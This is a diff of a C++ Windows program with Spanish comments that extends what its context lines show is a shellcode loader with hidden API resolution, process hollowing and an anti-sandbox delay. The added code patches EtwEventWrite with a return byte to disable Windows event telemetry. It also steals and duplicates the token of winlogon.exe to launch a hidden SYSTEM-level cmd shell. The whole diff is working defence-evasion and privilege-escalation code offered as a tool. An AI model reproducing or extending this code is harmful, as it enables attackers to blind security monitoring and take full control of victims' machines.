@@ -12,7 +12,9 @@
 #include <cfgmgr32.h>
 #include <array>
 #include <winternl.h>
-
+#include <vector>
+#include <random>
+#include <algorithm>
 
 struct APIAddresses {
     // kernel32.dll
@@ -49,6 +51,10 @@ struct APIAddresses {
     BOOL(WINAPI *ReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
     DWORD(WINAPI *ResumeThread)(HANDLE);
     BOOL(WINAPI *TerminateProcess)(HANDLE, UINT);
+    // Nuevas APIs para elevacion de privilegios
+    BOOL(WINAPI *OpenProcessToken)(HANDLE, DWORD, PHANDLE);
+    BOOL(WINAPI *DuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
+    BOOL(WINAPI * CreateProcessWithTokenW)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
     //UINT(WINAPI *GetSystemDirectoryA)(LPSTR, UINT);
     // user32.dll
     int(WINAPI *MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
@@ -1028,6 +1034,12 @@ bool InitializeAPIs() {
         std::cerr << "Ntdll no encontrado" << std::endl;
         return false;
     }
+
+    HMODULE advapi32Base = GetModuleBaseAddress("advapi32.dll");
+    if (!advapi32Base){
+        std::cerr << "advapi32.dll no encontrado" << std::endl;
+        return false;
+    }
     
     std::cout << "Modulos base obtenidos correctamente" << std::endl;
     
@@ -1129,6 +1141,15 @@ bool InitializeAPIs() {
     
     const char* terminateProcessName ="TerminateProcess";
     APIs.TerminateProcess = (BOOL(WINAPI*)(HANDLE, UINT))GetProcAddressHidden(kernel32Base, terminateProcessName);
+
+    const char* openProcessTokenName = "OpenProcessToken";
+    APIs.OpenProcessToken = (BOOL(WINAPI*)(HANDLE, DWORD, PHANDLE))GetProcAddressHidden(advapi32Base, openProcessTokenName);
+
+    const char* duplicateTokenExName = "DuplicateTokenEx";
+   APIs.DuplicateTokenEx = (BOOL(WINAPI*)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE))GetProcAddressHidden(advapi32Base, duplicateTokenExName);
+
+   const char* createProcessWithTokenWName = "CreateProcessWithTokenW";
+    APIs.CreateProcessWithTokenW = (BOOL(WINAPI*)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION))GetProcAddressHidden(advapi32Base, createProcessWithTokenWName);
     
     // Resolver las APIs de user32.dll
     //const char* messageBoxAName ="MessageBoxA");
@@ -1153,13 +1174,149 @@ bool InitializeAPIs() {
         !APIs.GetExitCodeThread || !APIs.VirtualFree || !APIs.NtAllocateVirtualMemory ||
         // Nuevas APIs para Process Hollowing
         !APIs.CreateProcessA || !APIs.GetThreadContext || !APIs.SetThreadContext ||
-        !APIs.ReadProcessMemory || !APIs.ResumeThread || !APIs.TerminateProcess || !APIs.NtAllocateVirtualMemory) {
+        !APIs.ReadProcessMemory || !APIs.ResumeThread || !APIs.TerminateProcess || !APIs.NtAllocateVirtualMemory ||
+        !APIs.OpenProcessToken || !APIs.DuplicateTokenEx || !APIs.CreateProcessWithTokenW) {
         std::cerr << "Error al resolver una o más APIs" << std::endl;
         return false;
     }
     
     std::cout << "Todas las APIs resueltas correctamente" << std::endl;
     return true;
+}
+
+// Funcion para parchear el EtWEventWrite
+bool PatchEtwEventWrite() {
+    HMODULE ntdllBase = GetModuleBaseAddress("ntdll.dll");
+    if (!ntdllBase) {
+        std::cerr << "No se pudo obtener ntdll.dll" << std::endl;
+        return false;
+    }
+
+    FARPROC pEtwEventWrite = GetProcAddressHidden(ntdllBase, "EtwEventWrite");
+    if (!pEtwEventWrite) {
+        std::cerr << "No se pudo obtener EtwEventWrite" << std::endl;
+        return false;
+    }
+
+    // Bytes del parche: ret (0xC3)
+    BYTE patch[] = { 0xC3 };
+
+    LPVOID pEtwEventWriteVoid = reinterpret_cast<LPVOID>(pEtwEventWrite);
+
+    DWORD oldProtect;
+    if (!APIs.VirtualProtect(pEtwEventWriteVoid, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        std::cerr << "VirtualProtect failed: " << APIs.GetLastError() << std::endl;
+        return false;
+    }
+
+    BYTE originalBytes[sizeof(patch)];
+    memcpy(originalBytes, pEtwEventWriteVoid, sizeof(patch));
+
+    memcpy(pEtwEventWriteVoid, patch, sizeof(patch));
+
+    if (!APIs.VirtualProtect(pEtwEventWriteVoid, sizeof(patch), oldProtect, &oldProtect)) {
+        std::cerr << "VirtualProtect (restore) failed: " << APIs.GetLastError() << std::endl;
+        return false;
+    }
+
+    std::cout << "ETW parcheado correctamente" << std::endl;
+    return true;
+}
+
+
+// Funcion para obetener el PID de un proceso por nombre
+DWORD GetPidByName(const std::wstring& name){
+    PROCESSENTRY32W entry = { sizeof(entry) };
+    HANDLE snapshot = APIs.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    DWORD pid = 0;
+
+    if (snapshot == INVALID_HANDLE_VALUE){
+        std::cerr << "CreateToolhelp32Snapshot fallo: " << APIs.GetLastError() << std::endl;
+        return 0;
+    }
+
+    if (APIs.Process32First(snapshot, (LPPROCESSENTRY32)&entry)){
+        do {
+            if (name == entry.szExeFile){
+                pid = entry.th32ProcessID;
+                break;
+            }
+        } while (APIs.Process32Next(snapshot, (LPPROCESSENTRY32)&entry));
+    }
+
+    APIs.CloseHandle(snapshot);
+    return pid;
+}
+
+// Funcion para elevacion de privilegios con token spoofing
+bool ElevatePrivilegesWithToken(){
+    const wchar_t* targetProcess = L"winlogon.exe";
+    const wchar_t* systemCmd = L"C\\Windows\\System32\\cmd.exe";
+
+    DWORD targetPid = GetPidByName(targetProcess);
+    if (targetPid == 0){
+        std::wcerr << L"No se encontro el proceso" << targetProcess << std::endl;
+        return false;
+    }
+
+    HANDLE hProc = APIs.OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
+    if (!hProc){
+        std::wcerr << L"No se pudo abrir el proceso" << APIs.GetLastError() << std::endl;
+        return false;
+    }
+
+    HANDLE hToken;
+    if (!APIs.OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)){
+        std::wcerr << L"No se pudo abrir el token: " << APIs.GetLastError() << std::endl;
+        APIs.CloseHandle(hProc);
+        return false; 
+    }
+
+    HANDLE hDupToken;
+    if (!APIs.DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)){
+        std::wcerr << L"No se pudo abrir el token: " << APIs.GetLastError() << std::endl;
+        APIs.CloseHandle(hProc);
+        return false;
+    }
+
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+
+    if (APIs.CreateProcessWithTokenW(hDupToken, 0, systemCmd, NULL, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)){
+        std::wcout << L"Shell con privilegios SYSTEM creada" << std::endl;
+
+        APIs.CloseHandle(pi.hProcess);
+        APIs.CloseHandle(pi.hThread);
+        APIs.CloseHandle(hDupToken);
+        APIs.CloseHandle(hToken);
+        APIs.CloseHandle(hProc);
+
+        return true;
+    } else {
+        std::wcerr << L"No se pudo crear el proceso: " << APIs.GetLastError() << std::endl;
+        
+        APIs.CloseHandle(hDupToken);
+        APIs.CloseHandle(hToken);
+        APIs.CloseHandle(hProc);
+
+        return false;
+    }
+
+}
+
+std::vector<std::wstring> GetSystemTempDirectories(){
+    std::vector<std::wstring> tempDirs;
+    wchar_t tempPath[MAX_PATH];
+
+    if (GetTempPathW(MAX_PATH, tempPath)){
+        tempDirs.push_back(tempPath);
+    }
+
+    GetSystemDirectoryW(tempPath, MAX_PATH);
+    wcscat_s(tempPath, MAX_PATH, L"\\temp");
+    tempDirs.push_back(tempPath);
+
+    return tempDirs;
 }
 
 // Funcion principal
@@ -1182,6 +1339,16 @@ int main() {
     
     // Retraso anti-sandbox
     AntiSandboxDelay();
+
+    if (!PatchEtwEventWrite()){
+        std::cerr << "No se puedo parchear EtwEventWrite" << std::endl;
+    }
+    std::cout << "Se parcheo correctamente el EtwEventWrite" << std::endl;
+
+    if (ElevatePrivilegesWithToken()){
+        std::cout << "Elevacion de privilegios completada exitosamente" << std::endl;
+        return 0;
+    }
     
     // Calcular el tamaño real del shellcode
     const DWORD shellcodeSize = CalculateShellcodeSize();
